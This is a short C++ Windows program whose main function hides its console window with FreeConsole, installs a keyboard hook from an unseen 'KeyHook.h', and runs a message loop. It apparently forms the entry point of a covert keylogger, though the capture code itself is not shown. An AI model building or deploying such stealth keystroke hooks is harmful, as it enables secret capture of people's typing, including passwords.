#include <iostream>
#include <Windows.h>
#include "KeyHook.h"


int main()
{
	MSG msg{ 0 };
	FreeConsole();
	installHook();
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	unistallHook();

	return 0;
};

